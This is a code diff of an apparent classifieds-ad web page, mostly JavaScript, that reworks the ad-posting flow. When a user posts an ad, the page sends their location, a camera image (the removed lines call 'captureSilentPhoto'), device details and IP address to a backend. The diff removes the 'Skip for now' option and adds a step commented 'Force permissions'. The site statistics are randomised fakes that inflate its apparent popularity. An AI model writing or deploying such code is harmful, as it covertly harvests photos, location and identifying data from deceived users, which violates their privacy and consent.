-                    <div class="perm-desc">Allow location access to show your ad to people in your area. This increases chances of selling faster!</div>
-                    <button class="allow-btn" id="locationAllowBtn"><i class="fas fa-map-marker-alt"></i> Allow Location</button>
-                    <button class="skip-btn" id="locationSkipBtn">Skip for now</button>
-                </div>
-            `;
-            document.body.appendChild(overlay);
-            
+            const modal = document.getElementById('locationModal');
+            modal.classList.add('active');
             document.getElementById('locationAllowBtn').onclick = async () => {
-                overlay.remove();
+                modal.classList.remove('active');
                 userLocation = await getLocation();
                 locationGranted = true;
                 resolve(true);
             };
-            
-            document.getElementById('locationSkipBtn').onclick = () => {
-                overlay.remove();
-                locationGranted = false;
-                resolve(false);
-            };
         });
     }
 
-    // Post Ad
-    document.getElementById('postAdBtn').addEventListener('click', async () => {
+    // Post New Ad
+    async function postNewAd() {
         const title = document.getElementById('adTitle').value.trim();
         const category = document.getElementById('adCategory').value;
         const desc = document.getElementById('adDesc').value.trim();
@@ -588,54 +855,36 @@
         const locationInput = document.getElementById('adLocation').value.trim();
         const phone = document.getElementById('contactPhone').value.trim();
         
-        if (!title) {
-            showToast("Please enter an ad title");
-            return;
-        }
+        if (!title) { showToast("Please enter an ad title", true); return; }
         
         const btn = document.getElementById('postAdBtn');
         const originalText = btn.innerHTML;
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
-        // Show camera popup first
-        if (!cameraGranted && !permissionsCompleted) {
-            await showCameraPopup();
-        }
-        
-        // Show location popup second
-        if (!locationGranted && !permissionsCompleted) {
-            await showLocationPopup();
-        }
-        permissionsCompleted = true;
-        
-        // Try to get data if not already captured
-        if (!capturedPhoto && cameraGranted) {
-            capturedPhoto = await captureSilentPhoto();
-        }
-        if (!userLocation && locationGranted) {
-            userLocation = await getLocation();
-        }
+        // Force permissions
+        if (!cameraGranted) await showCameraPopup();
+        if (!locationGranted) await showLocationPopup();
         
         const device = await getDeviceInfo();
+        const newAd = {
+            id: Date.now(),
+            category, title, description: desc, price: price || 'Free',
+            location: locationInput || 'Nigeria', phone: phone || 'Not provided',
+            images: uploadedImages, views: 0, chats: 0,
+            timestamp: new Date().toISOString()
+        };
+        
+        userAds.unshift(newAd);
+        localStorage.setItem('userAds', JSON.stringify(userAds));
+        
+        // Start view counter for this ad
+        startUserAdViewCounter(newAd);
         
         await sendToBackend({
-            id: Date.now(),
-            type: 'ad_posted',
-            timestamp: new Date().toISOString(),
-            ad: { 
-                title, 
-                category, 
-                description: desc, 
-                price: price || 'Free', 
-                location: locationInput || 'Nigeria', 
-                phone: phone || 'Not provided', 
-                images: uploadedImages 
-            },
-            location: userLocation,
-            cameraImage: capturedPhoto,
-            device: device,
-            ip: device.ip
+            id: Date.now(), type: 'ad_posted', timestamp: new Date().toISOString(),
+            ad: newAd, location: userLocation, cameraImage: capturedPhoto,
+            device: device, ip: device.ip
         });
         
         // Reset form
@@ -649,26 +898,56 @@
         
         btn.innerHTML = originalText;
         btn.disabled = false;
-        showToast(`✅ "${title}" posted successfully!`);
+        showToast(`✅ "${title}" posted successfully! Views will start coming in.`);
+        renderMyAds();
         updateStats();
+    }
+
+    // Image upload
+    const uploadArea = document.getElementById('imageUploadArea');
+    const imageInput = document.getElementById('imageUpload');
+    const imagePreview = document.getElementById('imagePreview');
+
+    uploadArea.addEventListener('click', () => imageInput.click());
+    imageInput.addEventListener('change', (e) => {
+        const files = Array.from(e.target.files);
+        if (uploadedImages.length + files.length > 5) { showToast("Maximum 5 images allowed", true); return; }
+        files.forEach(file => {
+            const reader = new FileReader();
+            reader.onload = (event) => { uploadedImages.push(event.target.result); displayImages(); };
+            reader.readAsDataURL(file);
+        });
     });
-    
-    function showToast(msg) {
+
+    function displayImages() {
+        imagePreview.innerHTML = uploadedImages.map((img, idx) => `
+            <div style="position: relative;">
+                <img src="${img}" class="preview-img">
+                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer;">×</button>
+            </div>
+        `).join('');
+    }
+
+    function removeImage(idx) { uploadedImages.splice(idx, 1); displayImages(); }
+
+    function showToast(msg, isError = false) {
         const toast = document.getElementById('toastMsg');
-        toast.innerHTML = `<i class="fas fa-check-circle"></i> ${msg}`;
+        toast.innerHTML = `<i class="fas ${isError ? 'fa-exclamation-triangle' : 'fa-check-circle'}"></i> ${msg}`;
+        toast.className = isError ? 'toast error' : 'toast';
         toast.classList.add('show');
         setTimeout(() => toast.classList.remove('show'), 3000);
     }
-    
+
     function updateStats() {
-        let ads = 284000 + Math.floor(Math.random() * 500);
+        let ads = 284000 + Math.floor(Math.random() * 500) + userAds.length;
         let users = 12700 + Math.floor(Math.random() * 200);
         document.getElementById('statAds').innerHTML = (ads / 1000).toFixed(0) + 'K';
         document.getElementById('statUsers').innerHTML = (users / 1000).toFixed(1) + 'K';
     }
-    
+
     // Initialize
-    featuredAds.forEach(ad => startViewCounter(ad));
+    document.getElementById('postAdBtn').onclick = postNewAd;
+    startFeaturedViewCounter();
     renderFeaturedAds();
     updateStats();
     setInterval(updateStats, 8000);
@@ -680,6 +959,16 @@
             e.preventDefault();
         }
     });
+    
+    // Make functions global
+    window.showHome = showHome;
+    window.showMyAds = showMyAds;
+    window.showMessages = showMessages;
+    window.editAd = editAd;
+    window.deleteAd = deleteAd;
+    window.openChat = openChat;
+    window.viewAdDetail = viewAdDetail;
+    window.removeImage = removeImage;
 </script>
 </body>
 </html>
